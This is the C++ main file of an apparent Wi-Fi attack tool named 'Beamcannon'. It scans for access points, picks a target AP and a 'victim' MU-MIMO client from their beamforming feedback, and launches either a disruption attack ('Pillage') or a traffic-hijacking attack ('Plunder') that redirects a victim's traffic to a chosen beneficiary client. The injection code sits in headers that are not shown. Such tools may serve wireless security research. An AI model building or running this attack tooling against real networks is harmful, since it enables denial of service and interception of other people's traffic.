#include <iostream>
#include <unistd.h>
#include "core_types.h"
#include "sniffer.h"
#include "injector.h"

void print_usage(const char* prog) {
    std::cerr << "Usage: " << prog << " -i <interface> [-d]\n";
    std::cerr << "  -i : Monitor mode interface (e.g., wlan1)\n";
    std::cerr << "  -d : Enable debug output\n";
}

int main(int argc, char* argv[]) {
    std::string iface = "";
    bool debug = false;
    int opt;

    while ((opt = getopt(argc, argv, "i:dh")) != -1) {
        switch (opt) {
            case 'i': iface = optarg; break;
            case 'd': debug = true; break;
            case 'h': default: print_usage(argv[0]); return 1;
        }
    }

    if (iface.empty()) {
        print_usage(argv[0]);
        return 1;
    }

    std::cout << "[*] Initializing Beamcannon on " << iface << " (Debug: " << (debug ? "ON" : "OFF") << ")\n";

    Sniffer sniffer(iface, debug);
    
    // Step 1: Scan for APs
    std::cout << "[*] Scanning for APs (10 seconds)...\n";
    auto aps = sniffer.scan_aps(10);
    if (aps.empty()) {
        std::cerr << "[-] No APs found.\n";
        return 1;
    }

    std::cout << "\n--- Discovered APs ---\n";
    for (size_t i = 0; i < aps.size(); ++i) {
        std::cout << "[" << i << "] " << aps[i].bssid << " | Ch: " << aps[i].channel << " | " << aps[i].ssid << "\n";
    }
    
    int ap_idx;
    std::cout << "\nSelect AP target: ";
    std::cin >> ap_idx;
    APInfo target_ap = aps[ap_idx];

    // Step 2: Select Attack Mode
    std::cout << "\n--- Attack Modes ---\n";
    std::cout << "[1] Pillage (Target Disruption)\n";
    std::cout << "[2] Plunder (Traffic Hijacking)\n";
    int mode_sel;
    std::cout << "Select Mode: ";
    std::cin >> mode_sel;
    AttackMode mode = (mode_sel == 1) ? AttackMode::PILLAGE : AttackMode::PLUNDER;

    // Step 3: Scan for Beamforming Clients
    std::cout << "\n[*] Scanning for BFI Clients on AP " << target_ap.bssid << "...\n";
    auto clients = sniffer.scan_clients(target_ap, 15);
    if (clients.empty()) {
        std::cerr << "[-] No MU-MIMO clients found sending feedback.\n";
        return 1;
    }

    std::cout << "\n--- Active Beamforming Clients ---\n";
    for (size_t i = 0; i < clients.size(); ++i) {
        std::cout << "[" << i << "] " << clients[i].mac << " | RSSI: " << clients[i].rssi << "\n";
    }

    int vic_idx;
    std::cout << "\nSelect Victim Client: ";
    std::cin >> vic_idx;
    ClientInfo victim = clients[vic_idx];

    // Step 4: Execute Strategy
    Injector injector(iface, debug);
    if (mode == AttackMode::PILLAGE) {
        std::cout << "\n[!] Launching Pillage against " << victim.mac << "\n";
        injector.run_pillage(target_ap, victim);
    } else {
        int qm_idx;
        std::cout << "\nSelect Quartermaster (Beneficiary) Client: ";
        std::cin >> qm_idx;
        ClientInfo qm = clients[qm_idx];
        std::cout << "\n[!] Launching Plunder. Victim: " << victim.mac << " -> QM: " << qm.mac << "\n";
        injector.run_plunder(target_ap, victim, qm);
    }

    return 0;
}
